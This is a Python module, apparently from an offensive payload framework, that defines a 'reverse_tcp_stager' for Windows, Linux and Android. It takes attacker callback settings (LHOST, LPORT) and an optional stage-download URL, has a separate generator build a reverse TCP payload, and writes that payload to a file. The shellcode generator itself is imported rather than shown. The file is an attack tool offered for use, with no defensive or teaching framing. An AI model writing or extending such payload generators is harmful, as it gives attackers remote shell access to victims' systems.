import socket
import struct
from core.module_base import PayloadModule

class ReverseTCP(PayloadModule):
    NAME = "reverse_tcp_stager"
    DESCRIPTION = "Reverse TCP stager with stage downloading capability"
    AUTHOR = "Anonymous-beta"
    PLATFORM = ["windows", "linux", "android"]
    
    def _setup_options(self):
        super()._setup_options()
        self.options["STAGE_URL"] = {
            "description": "URL to download stage from",
            "required": False,
            "value": ""
        }
    
    def execute(self):
        """Generate reverse TCP payload"""
        lhost = self.get_option("LHOST")
        lport = int(self.get_option("LPORT"))
        fmt = self.get_option("FORMAT")
        arch = self.get_option("ARCH")
        
        print(f"[*] Generating reverse_tcp for {arch}")
        print(f"[*] Callback: {lhost}:{lport}")
        
        from core.payload_generator import PayloadGenerator
        gen = PayloadGenerator()
        
        payload = gen.generate("reverse_tcp", arch=arch, lhost=lhost, lport=lport)
        formatted = gen.format_payload(payload, fmt)
        
        # Save to file
        output_file = f"zaiyan_payload_{fmt}"
        with open(output_file, "wb") as f:
            f.write(formatted)
        
        print(f"[+] Payload saved to {output_file}")
        print(f"[+] Size: {len(formatted)} bytes")
        
        return formatted
